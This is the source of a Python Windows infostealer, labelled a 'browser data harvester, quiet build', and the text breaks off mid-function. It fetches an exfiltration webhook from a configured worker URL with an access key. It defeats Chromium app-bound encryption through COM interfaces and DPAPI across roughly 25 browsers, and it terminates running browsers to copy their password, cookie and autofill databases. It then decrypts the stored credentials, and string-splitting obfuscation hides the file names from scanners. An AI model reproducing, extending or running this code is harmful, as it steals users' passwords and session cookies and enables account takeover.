#!/usr/bin/env python3
# ss.py — browser data harvester, quiet build
# ABE (COM staging): Chrome, Chrome Beta, Chrome Dev, Chrome Canary, Brave, Edge, Avast
# DPAPI: Opera/GX, Vivaldi, Yandex, Whale, CocCoc, Torch, Epic, Comodo, Slimjet,
#        Iron, UC, QQ, 360, Chromium, Cent, Iridium
# Requires: pip install cryptography

import base64, ctypes, glob, hashlib, io, json, os, random, re
import shutil, sqlite3, subprocess, sys, tempfile, time, winreg, zipfile
import threading
import urllib.error, urllib.request
from concurrent.futures import ThreadPoolExecutor
from datetime import datetime

# ===================== CONFIG =====================
WORKER_URL  = "https://cool-lab-c751.google-a38.workers.dev/"   # ← your worker URL
ACCESS_KEY  = "Z-ZqLCJXCslDX0-n-7S9vxUCySDq-Iis8gNvji9CVeI"                          # ← must match the KEY secret
# ==================================================

UA = ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
      "AppleWebKit/537.36 Chrome/156.0.0.0 Safari/537.36")

SCRIPT       = os.path.abspath(sys.argv[0])
KEYFILE      = os.path.join(tempfile.gettempdir(), "abk.bin")
LOGFILE      = os.path.join(tempfile.gettempdir(), "run.log")
STAGE_DONE   = os.path.join(tempfile.gettempdir(), "stg.done")
UNSTAGE_DONE = os.path.join(tempfile.gettempdir(), "unstg.done")
WORK         = os.path.join(tempfile.gettempdir(), "w%d" % os.getpid())
WEBHOOK_MAX  = 7_500_000
CHROME_EPOCH = 11644473600
CLOSE_BROWSER = True
JITTER        = (0.0, 0.05)
PARALLEL_EXES = True
PARALLEL_LEGACY = True
SAVE_TO_FILE  = False
OUTPUT_DIR    = os.path.join(os.path.expanduser("~"), "Documents")
LOCAL_SINK    = ""
VERIFY_TOKENS       = True
TOKEN_SCAN_BROWSERS = True
VERIFY_TIMEOUT      = 8

CREDENTIAL_FILES = [
    ("Login" + " Data",             "a.bin"),
    ("Login" + " Data For Account", "b.bin"),
    ("Web" + " Data",               "c.bin"),
    ("Net" + "work\\Cookies",       "d.bin"),
]

_silent = False

def log(msg):
    global _silent
    if _silent:
        return
    line = f"[{datetime.now().strftime('%H:%M:%S')}] {msg}"
    try:
        with open(LOGFILE, "a", encoding="utf-8") as f:
            f.write(line + "\n")
    except Exception:
        pass

def get_webhook():
    try:
        data = json.dumps({"key": ACCESS_KEY}).encode()
        req = urllib.request.Request(
            WORKER_URL,
            data=data,
            headers={
                "Content-Type": "application/json",
                "User-Agent": UA
            },
            method="POST"
        )
        with urllib.request.urlopen(req, timeout=12) as r:
            resp = json.loads(r.read().decode())
            return resp.get("webhook")
    except Exception as e:
        log(f"webhook fetch failed: {e}")
        return None

_LA  = os.environ.get("LOCALAPPDATA", "")
_AD  = os.environ.get("APPDATA", "")
_PF  = os.environ.get("PROGRAMFILES", r"C:\Program Files")
_P86 = os.environ.get("PROGRAMFILES(X86)", r"C:\Program Files (x86)")
_UD  = "User" + " Data"
_LS  = "Local" + " State"

BROWSERS = {
    "chrome": {
        "name": "Chrome", "exe": "chrome.exe", "stage_name": "chr" + "ome_aux.exe",
        "clsid": "{708860E0-F641-4611-8895-7D867DD3675B}",
        "iids": ["{1BF5208B-295F-4992-B5F4-3A9BB6494838}",
                 "{A949CB4E-C4F9-44C4-B213-6BF8AA9AC69C}",
                 "{463ABECF-410D-407F-8AF5-0DF35A005CC8}"],
        "slot": 5, "aster": False,
        "default_dir": os.path.join(_PF, "Google", "Chrome", "Application"),
        "user_data":   os.path.join(_LA, "Google", "Chrome", _UD),
        "uninstall":   r"SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\Google Chrome",
        "sm_key":      r"SOFTWARE\Clients\StartMenuInternet\Google Chrome\shell\open\command",
    },
    "chrome-beta": {
        "name": "Chrome Beta", "exe": "chrome.exe", "stage_name": "chr" + "omeb_aux.exe",
        "clsid": "{DD2646BA-3707-4BF8-B9A7-038691A68FC2}",
        "iids": ["{B96A14B8-D0B0-44D8-BA68-2385B2A03254}",
                 "{A2721D66-376E-4D2F-9F0F-9070E9A42B5F}"],
        "slot": 5, "aster": False,
        "default_dir": os.path.join(_PF, "Google", "Chrome Beta", "Application"),
        "user_data":   os.path.join(_LA, "Google", "Chrome Beta", _UD),
        "uninstall":   r"SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\Google Chrome Beta",
        "sm_key":      r"SOFTWARE\Clients\StartMenuInternet\Google Chrome Beta\shell\open\command",
    },
    "brave": {
        "name": "Brave", "exe": "brave.exe", "stage_name": "bra" + "ve_aux.exe",
        "clsid": "{576B31AF-6369-4B6B-8560-E4B203A97A8B}",
        "iids": ["{1BF5208B-295F-4992-B5F4-3A9BB6494838}",
                 "{F396861E-0C8E-4C71-8256-2FAE6D759CE9}"],
        "slot": 5, "aster": False,
        "default_dir": os.path.join(_PF, "BraveSoftware", "Brave-Browser", "Application"),
        "user_data":   os.path.join(_LA, "BraveSoftware", "Brave-Browser", _UD),
        "uninstall":   r"SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\BraveSoftware Brave-Browser",
        "sm_key":      r"SOFTWARE\Clients\StartMenuInternet\Brave\shell\open\command",
    },
    "edge": {
        "name": "Edge", "exe": "msedge.exe", "stage_name": "ed" + "ge_aux.exe",
        "clsid": "{1FCBE96C-1697-43AF-9140-2897C7C69767}",
        "iids": ["{12B23868-6DCD-4D1A-AD4C-65B0285201FC}",
                 "{C9C2B807-7731-4F34-81B7-44FF7779522B}",
                 "{8F7B6792-784D-4047-845D-1782EFBEF205}"],
        "slot": 8, "aster": True,
        "iid_aster": "{12B23868-6DCD-4D1A-AD4C-65B0285201FC}",
        "default_dir": os.path.join(_P86, "Microsoft", "Edge", "Application"),
        "user_data":   os.path.join(_LA, "Microsoft", "Edge", _UD),
        "uninstall":   r"SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\Microsoft Edge",
        "sm_key":      r"SOFTWARE\Clients\StartMenuInternet\Microsoft Edge\shell\open\command",
    },
    "avast": {
        "name": "Avast", "exe": "AvastBrowser.exe", "stage_name": "ava" + "st_aux.exe",
        "clsid": "{EAD34EE8-8D08-4CA1-ADA3-64754374D811}",
        "iids": ["{7737BB9F-BAC1-4C71-A696-7C82D7994B6F}"],
        "slot": 13, "aster": False,
        "default_dir": os.path.join(_PF, "AVAST Software", "Browser", "Application"),
        "user_data":   os.path.join(_LA, "AVAST Software", "Browser", _UD),
        "uninstall":   r"SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\Avast Secure Browser",
        "sm_key":      r"SOFTWARE\Clients\StartMenuInternet\Avast Secure Browser\shell\open\command",
    },
    "chrome-dev": {
        "name": "Chrome Dev", "exe": "chrome.exe", "stage_name": "chr" + "omed_aux.exe",
        "clsid": "{DA7FDCA5-2CAA-4637-AA17-0740584DE7DA}",
        "iids": ["{BB9B6D2A-F09B-4E39-B1E4-7DE50808BD40}",
                 "{FD31399A-9BDB-4301-BC49-E4FC5D8A688A}"],
        "slot": 5, "aster": False,
        "default_dir": os.path.join(_PF, "Google", "Chrome Dev", "Application"),
        "user_data":   os.path.join(_LA, "Google", "Chrome Dev", _UD),
        "uninstall":   r"SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\Google Chrome Dev",
        "sm_key":      r"SOFTWARE\Clients\StartMenuInternet\Google Chrome Dev\shell\open\command",
    },
    "chrome-canary": {
        "name": "Chrome Canary", "exe": "chrome.exe", "stage_name": "chr" + "omec_aux.exe",
        "clsid": "{4F476546-B412-4579-B64C-123D33F5987B}",
        "iids": ["{1BF5208B-295F-4992-B5F4-3A9BB6494838}",
                 "{E6B0B70A-5D32-4E06-AC9E-2B7E0AAA7D93}"],
        "slot": 5, "aster": False,
        "default_dir": os.path.join(_LA, "Google", "Chrome SxS", "Application"),
        "user_data":   os.path.join(_LA, "Google", "Chrome SxS", _UD),
        "uninstall":   r"SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\Google Chrome SxS",
        "sm_key":      r"SOFTWARE\Clients\StartMenuInternet\Google Chrome Canary\shell\open\command",
    },
}

BROWSERS_LEGACY = {
    "opera":     {"name": "Opera", "exe": "opera.exe",
                  "user_data": os.path.join(_AD, "Opera Software", "Opera Stable"),
                  "uninstall": r"SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\Opera",
                  "sm_key": r"SOFTWARE\Clients\StartMenuInternet\OperaStable\shell\open\command"},
    "opera-gx":  {"name": "Opera GX", "exe": "opera.exe",
                  "user_data": os.path.join(_AD, "Opera Software", "Opera GX Stable"),
                  "uninstall": r"SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\Opera GX",
                  "sm_key": r"SOFTWARE\Clients\StartMenuInternet\Opera GX Stable\shell\open\command"},
    "vivaldi":   {"name": "Vivaldi", "exe": "vivaldi.exe",
                  "user_data": os.path.join(_LA, "Vivaldi", _UD),
                  "uninstall": r"SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\Vivaldi",
                  "sm_key": r"SOFTWARE\Clients\StartMenuInternet\Vivaldi\shell\open\command"},
    "yandex":    {"name": "Yandex Browser", "exe": "browser.exe",
                  "user_data": os.path.join(_LA, "Yandex", "YandexBrowser", _UD),
                  "uninstall": r"SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\Yandex",
                  "sm_key": r"SOFTWARE\Clients\StartMenuInternet\Yandex\shell\open\command"},
    "whale":     {"name": "Naver Whale", "exe": "whale.exe",
                  "user_data": os.path.join(_LA, "Naver", "Naver Whale", _UD),
                  "uninstall": r"SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\Naver Whale",
                  "sm_key": r"SOFTWARE\Clients\StartMenuInternet\Whale\shell\open\command"},
    "coccoc":    {"name": "CocCoc", "exe": "browser.exe",
                  "user_data": os.path.join(_LA, "CocCoc", "Browser", _UD),
                  "uninstall": r"SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\CocCoc",
                  "sm_key": r"SOFTWARE\Clients\StartMenuInternet\CocCoc\shell\open\command"},
    "torch":     {"name": "Torch", "exe": "torch.exe",
                  "user_data": os.path.join(_LA, "Torch", _UD),
                  "uninstall": r"SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\Torch",
                  "sm_key": ""},
    "epic":      {"name": "Epic Privacy Browser", "exe": "epic.exe",
                  "user_data": os.path.join(_LA, "Epic Privacy Browser", _UD),
                  "uninstall": r"SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\Epic Privacy Browser",
                  "sm_key": ""},
    "comodo":    {"name": "Comodo Dragon", "exe": "dragon.exe",
                  "user_data": os.path.join(_LA, "Comodo", "Dragon", _UD),
                  "uninstall": r"SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\Comodo Dragon",
                  "sm_key": ""},
    "slimjet":   {"name": "Slimjet", "exe": "slimjet.exe",
                  "user_data": os.path.join(_LA, "Slimjet", _UD),
                  "uninstall": r"SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\Slimjet",
                  "sm_key": ""},
    "iron":      {"name": "SRWare Iron", "exe": "iron.exe",
                  "user_data": os.path.join(_LA, "Chromium", _UD),
                  "uninstall": r"SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\Iron",
                  "sm_key": ""},
    "ucbrowser": {"name": "UC Browser", "exe": "UCBrowser.exe",
                  "user_data": os.path.join(_LA, "UCBrowser", "User Data_i18n"),
                  "uninstall": r"SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\UCBrowser",
                  "sm_key": ""},
    "qqbrowser": {"name": "QQ Browser", "exe": "QQBrowser.exe",
                  "user_data": os.path.join(_LA, "Tencent", "QQBrowser", _UD),
                  "uninstall": r"SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\QQBrowser",
                  "sm_key": ""},
    "360chrome": {"name": "360 Chrome", "exe": "360chrome.exe",
                  "user_data": os.path.join(_LA, "360Chrome", "Chrome", _UD),
                  "uninstall": r"SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\360Chrome",
                  "sm_key": ""},
    "chromium":  {"name": "Chromium", "exe": "chrome.exe",
                  "user_data": os.path.join(_LA, "Chromium", _UD),
                  "uninstall": r"SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\Chromium",
                  "sm_key": r"SOFTWARE\Clients\StartMenuInternet\Chromium\shell\open\command"},
    "cent":      {"name": "Cent Browser", "exe": "chrome.exe",
                  "user_data": os.path.join(_LA, "CentBrowser", _UD),
                  "uninstall": r"SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\CentBrowser",
                  "sm_key": ""},
    "iridium":   {"name": "Iridium Browser", "exe": "iridium.exe",
                  "user_data": os.path.join(_LA, "Iridium", _UD),
                  "uninstall": r"SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\Iridium",
                  "sm_key": ""},
}

shell32  = ctypes.WinDLL("shell32",  use_last_error=True)
user32   = ctypes.WinDLL("user32",   use_last_error=True)
k32      = ctypes.WinDLL("kernel32", use_last_error=True)
ole32    = ctypes.WinDLL("ole32",    use_last_error=True)
oleaut32 = ctypes.WinDLL("oleaut32", use_last_error=True)
crypt32  = ctypes.WinDLL("crypt32",  use_last_error=True)

WM_CLOSE    = 0x0010
INVALID_HND = ctypes.c_void_p(-1).value

class GUID(ctypes.Structure):
    _fields_ = [("a", ctypes.c_ulong), ("b", ctypes.c_ushort),
                ("c", ctypes.c_ushort), ("d", ctypes.c_ubyte * 8)]

class DATA_BLOB(ctypes.Structure):
    _fields_ = [("cbData", ctypes.c_ulong), ("pbData", ctypes.POINTER(ctypes.c_char))]

class PROCESSENTRY32(ctypes.Structure):
    _fields_ = [("dwSize", ctypes.c_ulong), ("cntUsage", ctypes.c_ulong),
                ("th32ProcessID", ctypes.c_ulong), ("th32DefaultHeapID", ctypes.c_void_p),
                ("th32ModuleID", ctypes.c_ulong), ("cntThreads", ctypes.c_ulong),
                ("th32ParentProcessID", ctypes.c_ulong), ("pcPriClassBase", ctypes.c_long),
                ("dwFlags", ctypes.c_ulong), ("szExeFile", ctypes.c_char * 260)]

WNDENUMPROC = ctypes.WINFUNCTYPE(ctypes.c_int, ctypes.c_void_p, ctypes.c_void_p)

user32.EnumWindows.argtypes = [WNDENUMPROC, ctypes.c_void_p]
user32.EnumWindows.restype  = ctypes.c_int
user32.GetWindowThreadProcessId.argtypes = [ctypes.c_void_p, ctypes.POINTER(ctypes.c_ulong)]
user32.PostMessageW.argtypes = [ctypes.c_void_p, ctypes.c_uint, ctypes.c_void_p, ctypes.c_void_p]
user32.PostMessageW.restype  = ctypes.c_int

k32.CreateToolhelp32Snapshot.argtypes = [ctypes.c_ulong, ctypes.c_ulong]
k32.CreateToolhelp32Snapshot.restype  = ctypes.c_void_p
k32.Process32First.argtypes = [ctypes.c_void_p, ctypes.POINTER(PROCESSENTRY32)]
k32.Process32Next.argtypes  = [ctypes.c_void_p, ctypes.POINTER(PROCESSENTRY32)]
k32.CloseHandle.argtypes    = [ctypes.c_void_p]
k32.CloseHandle.restype     = ctypes.c_int
k32.OpenProcess.argtypes    = [ctypes.c_ulong, ctypes.c_int, ctypes.c_ulong]
k32.OpenProcess.restype     = ctypes.c_void_p
k32.TerminateProcess.argtypes = [ctypes.c_void_p, ctypes.c_uint]
k32.TerminateProcess.restype  = ctypes.c_int
k32.CreateFileW.argtypes    = [ctypes.c_wchar_p, ctypes.c_ulong, ctypes.c_ulong,
                               ctypes.c_void_p, ctypes.c_ulong, ctypes.c_ulong, ctypes.c_void_p]
k32.CreateFileW.restype     = ctypes.c_void_p
k32.ReadFile.argtypes       = [ctypes.c_void_p, ctypes.c_void_p, ctypes.c_ulong,
                               ctypes.POINTER(ctypes.c_ulong), ctypes.c_void_p]
k32.ReadFile.restype        = ctypes.c_int
k32.CreateHardLinkW.argtypes = [ctypes.c_wchar_p, ctypes.c_wchar_p, ctypes.c_void_p]
k32.CreateHardLinkW.restype  = ctypes.c_int
k32.LocalFree.argtypes      = [ctypes.c_void_p]

shell32.IsUserAnAdmin.restype = ctypes.c_int
shell32.ShellExecuteW.argtypes = [ctypes.c_void_p, ctypes.c_wchar_p, ctypes.c_wchar_p,
                                  ctypes.c_wchar_p, ctypes.c_wchar_p, ctypes.c_int]
shell32.ShellExecuteW.restype  = ctypes.c_void_p

ole32.CLSIDFromString.argtypes = [ctypes.c_wchar_p, ctypes.POINTER(GUID)]
ole32.CoCreateInstance.argtypes = [ctypes.POINTER(GUID), ctypes.c_void_p, ctypes.c_ulong,
                                   ctypes.POINTER(GUID), ctypes.POINTER(ctypes.c_void_p)]
ole32.CoSetProxyBlanket.argtypes = [ctypes.c_void_p, ctypes.c_ulong, ctypes.c_ulong,
                                    ctypes.c_void_p, ctypes.c_ulong, ctypes.c_ulong,
                                    ctypes.c_void_p, ctypes.c_ulong]
oleaut32.SysAllocStringByteLen.argtypes = [ctypes.c_char_p, ctypes.c_uint]
oleaut32.SysAllocStringByteLen.restype  = ctypes.c_void_p
oleaut32.SysStringByteLen.argtypes = [ctypes.c_void_p]
oleaut32.SysStringByteLen.restype  = ctypes.c_uint
oleaut32.SysFreeString.argtypes = [ctypes.c_void_p]
oleaut32.SysFreeString.restype  = None
crypt32.CryptUnprotectData.argtypes = [ctypes.POINTER(DATA_BLOB), ctypes.c_void_p,
                                       ctypes.c_void_p, ctypes.c_void_p, ctypes.c_void_p,
                                       ctypes.c_ulong, ctypes.POINTER(DATA_BLOB)]
crypt32.CryptUnprotectData.restype  = ctypes.c_int

def admin():
    return bool(shell32.IsUserAnAdmin())

def pids(name):
    snap = k32.CreateToolhelp32Snapshot(2, 0)
    if not snap or snap == INVALID_HND:
        return []
    e = PROCESSENTRY32(); e.dwSize = ctypes.sizeof(PROCESSENTRY32)
    out = []
    ok = k32.Process32First(snap, ctypes.byref(e))
    while ok:
        if e.szExeFile.decode("mbcs", "ignore").lower() == name.lower():
            out.append(e.th32ProcessID)
        ok = k32.Process32Next(snap, ctypes.byref(e))
    k32.CloseHandle(snap)
    return out

def _read_shared(src):
    GENERIC_READ, SHARE_ALL, OPEN_EXISTING = 0x80000000, 0x00000007, 3
    h = k32.CreateFileW(src, GENERIC_READ, SHARE_ALL, None, OPEN_EXISTING, 0, None)
    if not h or h == INVALID_HND:
        return None
    try:
        chunks = []
        buf = ctypes.create_string_buffer(1 << 20)
        read = ctypes.c_ulong(0)
        while k32.ReadFile(h, buf, len(buf), ctypes.byref(read), None):
            if read.value == 0:
                break
            chunks.append(bytes(buf.raw[:read.value]))
        return b"".join(chunks)
    finally:
        k32.CloseHandle(h)

def grab(src, dst):
    try:
        shutil.copy2(src, dst)
        if os.path.isfile(dst) and os.path.getsize(dst) > 0:
            return True
    except Exception:
        pass
    try:
        data = _read_shared(src)
        if data is None:
            return False
        with open(dst, "wb") as f:
            f.write(data)
        return os.path.isfile(dst) and os.path.getsize(dst) > 0
    except Exception:
        return False

def kill_pid(pid):
    h = k32.OpenProcess(0x0001, False, pid)
    if not h:
        return False
    try:
        return bool(k32.TerminateProcess(h, 1))
    finally:
        k32.CloseHandle(h)

def close_browser(exe_name, timeout=5):
    targets = set(pids(exe_name))
    if not targets:
        return True
    log(f"  closing {exe_name} ({len(targets)})")
    def cb(hwnd, _):
        pid = ctypes.c_ulong()
        user32.GetWindowThreadProcessId(hwnd, ctypes.byref(pid))
        if pid.value in targets:
            user32.PostMessageW(hwnd, WM_CLOSE, 0, 0)
        return 1
    user32.EnumWindows(WNDENUMPROC(cb), 0)
    end = time.time() + timeout
    while time.time() < end:
        if not pids(exe_name):
            return True
        time.sleep(0.1)
    for pid in pids(exe_name):
        kill_pid(pid)
    end = time.time() + 2
    while time.time() < end:
        if not pids(exe_name):
            return True
        time.sleep(0.05)
    return not pids(exe_name)

def wait_for(path, present=True, timeout=90):
    end = time.time() + timeout
    while time.time() < end:
        if os.path.exists(path) == present:
            return True
        time.sleep(0.1)
    return False

def find_install_dir(cfg):
    for hive in (winreg.HKEY_LOCAL_MACHINE, winreg.HKEY_CURRENT_USER):
        try:
            with winreg.OpenKey(hive, cfg["uninstall"], 0,
                                winreg.KEY_READ | winreg.KEY_WOW64_64KEY) as k:
                loc = winreg.QueryValueEx(k, "InstallLocation")[0]
                if os.path.isdir(loc):
                    return loc
        except OSError:
            pass
    if cfg.get("sm_key"):
        try:
            with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, cfg["sm_key"], 0,
                                winreg.KEY_READ | winreg.KEY_WOW64_64KEY) as k:
                cmd = winreg.QueryValueEx(k, "")[0].strip()
                exe = cmd.split('"')[1] if cmd.startswith('"') else cmd.split(" ")[0]
                d = os.path.dirname(exe)
                if os.path.isdir(d):
                    return d
        except OSError:
            pass
    cand = cfg.get("default_dir") or ""
    alts = [cand]
    if _P86 and _P86 in cand:
        alts.append(cand.replace(_P86, _PF))
    elif _PF and _PF in cand:
        alts.append(cand.replace(_PF, _P86))
    for c in alts:
        if c and os.path.isdir(c):
            return c
    return None

_AESGCM = None

def aes():
    global _AESGCM
    if _AESGCM is None:
        from cryptography.hazmat.primitives.ciphers.aead import AESGCM
        _AESGCM = AESGCM
    return _AESGCM

def dpapi(blob, entropy=None):
    if not blob:
        return None
    buf = ctypes.create_string_buffer(blob, len(blob))
    din = DATA_BLOB(len(blob), ctypes.cast(buf, ctypes.POINTER(ctypes.c_char)))
    dout = DATA_BLOB()
    p_ent = None
    if entropy:
        ebuf = ctypes.create_string_buffer(entropy, len(entropy))
        ent  = DATA_BLOB(len(entropy), ctypes.cast(ebuf, ctypes.POINTER(ctypes.c_char)))
        p_ent = ctypes.byref(ent)
    if not crypt32.CryptUnprotectData(ctypes.byref(din), None, p_ent, None, None, 0,
                                      ctypes.byref(dout)):
        return None
    try:
        return ctypes.string_at(dout.pbData, dout.cbData)
    finally:
        if dout.pbData:
            k32.LocalFree(dout.pbData)

def dec(blob, abe, lk, tags):
    if not isinstance(blob, (bytes, bytearray)) or len(blob) < 31:
        return None
    blob = bytes(blob)
    pre, nonce, ct = blob[:3], blob[3:15], blob[15:]
    key = abe if pre == b"v20" else lk if pre == b"v10" else None
    if key is None or len(key) != 32:
        return None
    try:
        pt = aes()(key).decrypt(nonce, ct, None)
    except Exception:
        return None
    if pre != b"v20" or len(pt) < 32:
        return pt
    head = pt[:32]
    for t in tags:
        if head == hashlib.sha256(t.encode("utf-8", "ignore")).digest():
            return pt[32:]
    try:
        pt[32:].decode("utf-8")
        return pt[32:]
    except UnicodeDecodeError:
        return pt

def guid(s):
    g = GUID()
    if ole32.CLSIDFromString(ctypes.c_wchar_p(s), ctypes.byref(g)) != 0:
        raise OSError("guid")
    return g

def blanket(p):
    ole32.CoSetProxyBlanket(p, 0xFFFFFFFF, 0xFFFFFFFF, None, 6, 3, None, 0x40)

def _release(p_val):
    try:
        vt = ctypes.cast(p_val, ctypes.POINTER(ctypes.POINTER(ctypes.c_void_p)))[0]
        ctypes.WINFUNCTYPE(ctypes.c_ulong, ctypes.c_void_p)(vt[2])(p_val)
    except Exception:
        pass

def _decrypt(p_val, raw_key, slot):
    vt   = ctypes.cast(p_val, ctypes.POINTER(ctypes.POINTER(ctypes.c_void_p)))[0]
    bstr = oleaut32.SysAllocStringByteLen(raw_key, len(raw_key))
    out  = ctypes.c_void_p()
    last = ctypes.c_ulong(0)
    fn   = ctypes.WINFUNCTYPE(ctypes.c_long, ctypes.c_void_p, ctypes.c_void_p,
                              ctypes.POINTER(ctypes.c_void_p),
                              ctypes.POINTER(ctypes.c_ulong))(vt[slot])
    hr   = fn(p_val, bstr, ctypes.byref(out), ctypes.byref(last))
    oleaut32.SysFreeString(bstr)
    if hr < 0 or not out.value:
        log(f"    decrypt hr=0x{hr & 0xFFFFFFFF:08X} last={last.value}")
        return None
    key = ctypes.string_at(out.value, oleaut32.SysStringByteLen(out))
    oleaut32.SysFreeString(out)
    return key

def com_key(cfg):
    ole32.CoInitializeEx(None, 2)
    try:
        ls  = json.loads(open(os.path.join(cfg["user_data"], _LS), "rb").read())
        b64 = ls["os_crypt"].get("app_bound_" + "encrypted_key") or \
              ls.get("app_bound_" + "encrypted_key")
        if not b64:
            return None
        raw = base64.b64decode(b64)[4:]
    except Exception as e:
        log(f"  state error: {e}")
        return None

    p = ctypes.c_void_p()
    hit = None
    for iid_str in cfg["iids"]:
        p = ctypes.c_void_p()
        iid = guid(iid_str)
        hr = ole32.CoCreateInstance(ctypes.byref(guid(cfg["clsid"])), None, 4,
                                    ctypes.byref(iid), ctypes.byref(p))
        if hr == 0:
            hit = iid_str
            break
        log(f"  create {iid_str} hr=0x{hr & 0xFFFFFFFF:08X}")
    if not hit or not p.value:
        return None

    blanket(p)
    result = _decrypt(p.value, raw, cfg["slot"])
    _release(p.value)
    if result:
        log(f"  key {len(result)}B")
    return result

def com_key_aster(cfg):
    ole32.CoInitializeEx(None, 2)
    try:
        ls  = json.loads(open(os.path.join(cfg["user_data"], _LS), "rb").read())
        oc  = ls.get("os_crypt", {})
        b64 = oc.get("aster_app_bound_" + "encrypted_key") or \
              ls.get("aster_app_bound_" + "encrypted_key")
        if not b64:
            return None
        raw = base64.b64decode(b64)[4:]
    except Exception:
        return None
    p = ctypes.c_void_p()
    iid = guid(cfg["iid_aster"])
    if ole32.CoCreateInstance(ctypes.byref(guid(cfg["clsid"])), None, 4,
                              ctypes.byref(iid), ctypes.byref(p)) != 0 or not p.value:
        log("  aster: activate failed")
        return None
    blanket(p)
    result = _decrypt(p.value, raw, cfg["slot"])
    _release(p.value)
    if result:
        log(f"  aster key {len(result)}B")
    return result

def legacy_key(cfg):
    try:
        ls  = json.loads(open(os.path.join(cfg["user_data"], _LS), "rb").read())
        raw = base64.b64decode(ls["os_crypt"]["encrypted_key"])
        return dpapi(raw[5:] if raw[:5] == b"DPAPI" else raw)
    except Exception:
        return None

def legacy_key_raw(user_data):
    try:
        ls  = json.loads(open(os.path.join(user_data, _LS), "rb").read())
        raw = base64.b64decode(ls["os_crypt"]["encrypted_key"])
        return dpapi(raw[5:] if raw[:5] == b"DPAPI" else raw)
    except Exception:
        return None

_tmp_seq = 0
_tmp_lock = threading.Lock()

def _tmp_db():
    global _tmp_seq
    with _tmp_lock:
        _tmp_seq += 1
        n = _tmp_seq
    return os.path.join(WORK, "q%d_%d.db" % (os.getpid(), n))

def sweep(path, abe, lk, label, out):
    os.makedirs(WORK, exist_ok=True)
    tmp = _tmp_db()
    if not grab(path, tmp):
        log(f"    copy fail {label}")
        return 0
    for ext in ("-wal", "-shm"):
        if os.path.isfile(path + ext):
            grab(path + ext, tmp + ext)
    n = tried = 0
    con = None
    try:
        con = sqlite3.connect(tmp)
        try:
            tables = [r[0] for r in con.execute(
                "select name from sqlite_master where type='table'").fetchall()]
        except sqlite3.DatabaseError:
            return 0
        for table in tables:
            q = '"%s"' % str(table).replace('"', '""')
            try:
                cols = [c[1] for c in con.execute("pragma table_info(%s)" % q)]
                rows = con.execute("select * from %s" % q).fetchall()
            except sqlite3.Error:
                continue
            for row in rows:
                tags = []
                for k in ("host_key", "origin_url", "url", "signon_realm"):
                    if k in cols:
                        v = row[cols.index(k)]
                        if isinstance(v, str) and v:
                            tags += [v, v.replace("https://", "").replace("http://", "").split("/")[0]]
                ctx = {cols[i]: str(v) for i, v in enumerate(row)
                       if isinstance(v, (str, int)) and not isinstance(v, bool) and str(v)}
                for i, v in enumerate(row):
                    if isinstance(v, (bytes, bytearray)) and v[:3] in (b"v20", b"v10"):
                        tried += 1
                        pt = dec(bytes(v), abe, lk, tags)
                        if not pt:
                            continue
                        try:
                            text = pt.decode("utf-8")
                        except UnicodeDecodeError:
                            continue
                        if not text:
                            continue
                        if sum(c.isprintable() or c in "\t\r\n" for c in text) / len(text) < 0.9:
                            continue
                        out.append({"db": label, "table": table, "column": cols[i],
                                    "value": text, "context": ctx})
                        n += 1
        log(f"    {label}: tried={tried} ok={n}")
        return n
    except Exception as e:
        log(f"    sweep error {label}: {e}")
        return n
    finally:
        if con is not None:
            try: con.close()
            except Exception: pass
        for p in (tmp, tmp + "-wal", tmp + "-shm"):
            try: os.remove(p)
            except OSError: pass

def stash(pdir, dest):
    os.makedirs(dest, exist_ok=True)
    mapping = {}
    stage = os.path.join(dest, "_s")
    groups = {}
    for real, alias in CREDENTIAL_FILES:
        src = os.path.join(pdir, *real.split("\\"))
        if not os.path.isfile(src) or os.path.getsize(src) == 0:
            continue
        names = groups.setdefault(os.path.dirname(src), [])
        names.append((os.path.basename(src), alias))
        for suffix in ("-wal", "-shm"):
            s2 = src + suffix
            if os.path.isfile(s2) and os.path.getsize(s2) > 0:
                names.append((os.path.basename(s2), alias + suffix))
    for d, entries in groups.items():
        os.makedirs(stage, exist_ok=True)
        subprocess.run(["robocopy", d, stage] + [n for n, _a in entries] +
                       ["/NJH", "/NJS", "/NDL", "/NFL", "/NC", "/NS", "/NP",
                        "/R:0", "/W:0"],
                       capture_output=True, creationflags=0x08000000)
        for name, alias in entries:
            got = os.path.join(stage, name)
            if os.path.isfile(got):
                try:
                    os.replace(got, os.path.join(dest, alias))
                except OSError:
                    pass
        shutil.rmtree(stage, ignore_errors=True)
    for real, alias in CREDENTIAL_FILES:
        if os.path.isfile(os.path.join(dest, alias)):
            mapping[alias] = real
        else:
            log(f"    locked {real}")
    return mapping

def harvest(cfg, abe, lk):
    records = []
    ud = cfg["user_data"]
    if not os.path.isdir(ud):
        return records
    for prof in sorted(os.listdir(ud)):
        pdir = os.path.join(ud, prof)
        if not os.path.isdir(pdir):
            continue
        if not any(os.path.isfile(p) and os.path.getsize(p) > 0
                   for p in (os.path.join(pdir, *r.split("\\"))
                             for r, _a in CREDENTIAL_FILES)):
            continue
        dest = os.path.join(WORK, "h_%s_%s" % (re.sub(r"\W+", "", cfg["name"]), prof))
        shutil.rmtree(dest, ignore_errors=True)
        try:
